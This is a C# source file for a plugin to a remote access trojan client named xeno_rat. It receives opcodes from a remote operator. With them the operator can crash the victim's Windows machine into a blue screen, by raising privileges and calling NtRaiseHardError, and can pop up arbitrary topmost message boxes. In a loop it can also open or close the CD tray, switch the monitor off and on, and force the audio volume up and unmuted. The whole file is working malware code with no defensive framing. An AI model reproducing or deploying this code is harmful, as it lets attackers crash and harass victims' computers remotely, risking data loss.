using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using xeno_rat_client;


namespace Plugin
{
    [ComImport]
    [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IAudioEndpointVolume
    {
        int f(); int g(); int h(); int i();
        int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
        int j();
        int GetMasterVolumeLevelScalar(out float pfLevel);
        int k(); int l(); int m(); int n();
        int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
        int GetMute(out bool pbMute);
    }

    [ComImport]
    [Guid("D666063F-1587-4E43-81F1-B948E807363F")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDevice
    {
        [PreserveSig]
        int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, [Out, MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
    }

    [ComImport]
    [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDeviceEnumerator
    {
        int f();
        [PreserveSig]
        int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
    }

    [ComImport]
    [Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
    class MMDeviceEnumeratorComObject
    {
    }
    public class Main
    {

        /// <summary>
        /// Adjusts the specified privilege for the current process or thread.
        /// </summary>
        /// <param name="Privilege">The privilege to be adjusted.</param>
        /// <param name="bEnablePrivilege">True to enable the privilege, false to disable it.</param>
        /// <param name="IsThreadPrivilege">True if the privilege is for the current thread, false if it's for the process.</param>
        /// <param name="PreviousValue">When this method returns, contains the previous state of the privilege.</param>
        /// <remarks>
        /// This method adjusts the specified privilege for the current process or thread. The <paramref name="Privilege"/> parameter specifies the privilege to be adjusted. The <paramref name="bEnablePrivilege"/> parameter determines whether to enable or disable the privilege. The <paramref name="IsThreadPrivilege"/> parameter specifies whether the privilege is for the current thread or the process. The <paramref name="PreviousValue"/> parameter contains the previous state of the privilege after the method is called.
        /// </remarks>
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        /// <summary>
        /// Calls the NtRaiseHardError function in ntdll.dll to raise a hard error.
        /// </summary>
        /// <param name="ErrorStatus">The error status code.</param>
        /// <param name="NumberOfParameters">The number of parameters.</param>
        /// <param name="UnicodeStringParameterMask">The mask for Unicode string parameters.</param>
        /// <param name="Parameters">A pointer to the array of parameters.</param>
        /// <param name="ValidResponseOption">The valid response option.</param>
        /// <param name="Response">Receives the user's response.</param>
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        /// <summary>
        /// Sends a command string to the MCI (Media Control Interface) device driver.
        /// </summary>
        /// <param name="lpstrCommand">The command string to be sent to the MCI device driver.</param>
        /// <param name="lpstrReturnString">A StringBuilder object that will receive the return string from the MCI device driver.</param>
        /// <param name="uReturnLength">The length of the return string buffer.</param>
        /// <param name="hWndCallback">A handle to the window that will receive notification messages from the MCI device driver. This parameter can be IntPtr.Zero if no callback messages are required.</param>
        /// <returns>The return value specifies the error status of the function call. Zero indicates success, while a non-zero value indicates an error.</returns>
        [DllImport("winmm.dll")]
        private static extern uint mciSendString(
            string lpstrCommand,
            StringBuilder lpstrReturnString,
            int uReturnLength,
            IntPtr hWndCallback
        );

        /// <summary>
        /// Sends the specified message to a window or windows. The SendMessage function calls the window procedure for the specified window and does not return until the window procedure has processed the message.
        /// </summary>
        /// <param name="hWnd">A handle to the window whose window procedure will receive the message.</param>
        /// <param name="Msg">The message to be sent.</param>
        /// <param name="wParam">Additional message-specific information.</param>
        /// <param name="lParam">Additional message-specific information.</param>
        /// <returns>The result of the message processing; it depends on the message sent.</returns>
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

        /// <summary>
        /// Sets the volume level of the default audio device.
        /// </summary>
        /// <param name="hwo">Handle to the waveform-audio output device. This parameter can also be a handle to a device driver or a waveform-audio stream handle.</param>
        /// <param name="dwVolume">Specifies the new volume setting. The low-order word contains the left-channel volume setting, and the high-order word contains the right-channel setting. A value of 0xFFFF represents full volume, and a value of 0x0000 is silence.</param>
        /// <exception cref="ArgumentException">Thrown when the <paramref name="hwo"/> parameter is invalid.</exception>
        /// <exception cref="InvalidOperationException">Thrown when the operation is not supported or the device is not ready.</exception>
        [DllImport("winmm.dll")]
        private static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);


        private const int HWND_BROADCAST = 0xffff;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MONITORPOWER = 0xF170;
        private const int MONITOR_OFF = 2;
        private const int MONITOR_ON = -1;

        /// <summary>
        /// Runs the specified node and performs different actions based on the received opcode.
        /// </summary>
        /// <param name="node">The node to be run.</param>
        /// <exception cref="InvalidOperationException">Thrown when the received opcode is not recognized.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array with value 3 to indicate that it has connected to the specified node.
        /// It then receives an opcode and performs different actions based on the received opcode:
        /// - If the opcode is 0, it triggers a blue screen.
        /// - If the opcode is 1, it shows a message box asynchronously.
        /// - If the opcode is 2, it starts a loop asynchronously and returns.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            int opcode = (await node.ReceiveAsync())[0];
            if (opcode == 0)
            {
                BlueScreen();
            }
            else if (opcode == 1)
            {
                await ShowMessageBox(node);
            }
            else if (opcode == 2) 
            {
                await StartLoop(node);
                return;
            }

        }

        /// <summary>
        /// Triggers a blue screen of death (BSOD) by raising a hard error.
        /// </summary>
        /// <remarks>
        /// This method triggers a blue screen of death (BSOD) by raising a hard error using the NtRaiseHardError function.
        /// It first adjusts the privilege using the RtlAdjustPrivilege function to enable the operation.
        /// </remarks>
        /// <exception cref="Exception">Thrown if there is an error while triggering the blue screen.</exception>
        public void BlueScreen()
        {
            RtlAdjustPrivilege(19, true, false, out bool tmp1);
            NtRaiseHardError(0xC0140002, 0, 0, IntPtr.Zero, 6, out uint tmp2);
        }

        /// <summary>
        /// Displays a message box with the specified text.
        /// </summary>
        /// <param name="node">The node from which to receive the message.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method asynchronously receives a message from the specified <paramref name="node"/> and displays it in a message box with the title "Message".
        /// The message box contains an "OK" button and no icon.
        /// </remarks>
        public async Task ShowMessageBox(Node node)
        {
            string text = Encoding.UTF8.GetString(await node.ReceiveAsync());
            await Task.Run(()=>MessageBox.Show(text, "Message",MessageBoxButtons.OK, MessageBoxIcon.None, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x40000));
        }

        /// <summary>
        /// Opens the CD tray.
        /// </summary>
        /// <remarks>
        /// This method sends a command to the multimedia control interface to open the CD tray.
        /// </remarks>
        public void OpenCDtray() 
        {
            mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
        }

        /// <summary>
        /// Closes the CD tray.
        /// </summary>
        public void CloseCdtray() 
        {
            mciSendString("set cdaudio door close", null, 0, IntPtr.Zero);
        }

        /// <summary>
        /// Turns off the monitor.
        /// </summary>
        /// <remarks>
        /// This method sends a system command to turn off the monitor by sending a message to the HWND_BROADCAST window handle with the WM_SYSCOMMAND message and the SC_MONITORPOWER parameter set to MONITOR_OFF.
        /// </remarks>
        public void MonitorOff()
        {
            SendMessage((IntPtr)HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF);
        }

        /// <summary>
        /// Turns on the monitor.
        /// </summary>
        /// <remarks>
        /// This method sends a message to the system to turn on the monitor using the SendMessage function.
        /// </remarks>
        public void MonitorOn()
        {
            SendMessage((IntPtr)HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_ON);
        }

        /// <summary>
        /// Sets the volume level of the default audio endpoint device.
        /// </summary>
        /// <param name="vol">The volume level to be set, in the range of 0 to 100.</param>
        /// <exception cref="System.Runtime.InteropServices.COMException">Thrown when a call to a COM component fails.</exception>
        public void SetVolume(int vol) 
        {
            const int eRender = 0;
            const int eMultimedia = 1;
            Guid IID_IAudioEndpointVolume = typeof(IAudioEndpointVolume).GUID;
            var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
            IMMDevice dev = null;
            Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(eRender, eMultimedia, out dev));
            object epv_obj = null;
            var epvid = new Guid("5CDF2C82-841E-4546-9722-0CF74078229A");
            Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, 0, IntPtr.Zero, out epv_obj));
            var epv = epv_obj as IAudioEndpointVolume;
            Guid guid = Guid.Empty;
            epv.SetMasterVolumeLevelScalar((float)vol /100f, guid);
            bool isMuted;
            epv.GetMute(out isMuted);
            if (isMuted)
            {
                epv.SetMute(false, guid);
            }
        }

        /// <summary>
        /// Starts a loop to continuously receive and process commands from the specified node.
        /// </summary>
        /// <param name="node">The node from which commands are received.</param>
        /// <exception cref="Exception">Thrown if there is an issue with the node connection.</exception>
        /// <returns>A <see cref="Task"/> representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method continuously loops while the node is connected, receiving an opcode from the node and performing the corresponding action.
        /// The opcode values determine the actions to be taken:
        /// 1 - Opens the CD tray.
        /// 2 - Closes the CD tray.
        /// 3 - Turns off the monitor.
        /// 4 - Turns on the monitor.
        /// 5 - Sets the volume to the value received from the node.
        /// </remarks>
        public async Task StartLoop(Node node) 
        {
            while (node.Connected()) 
            {
                int opcode = (await node.ReceiveAsync())[0];
                if (opcode == 1)
                {
                    OpenCDtray();
                }
                else if (opcode == 2)
                {
                    CloseCdtray();
                }
                else if (opcode == 3)
                {
                    MonitorOff();
                }
                else if (opcode == 4)
                {
                    MonitorOn();
                }
                else if (opcode == 5) 
                {
                    int volume = (await node.ReceiveAsync())[0];
                    SetVolume(volume);
                }
            }
        }
    }
}
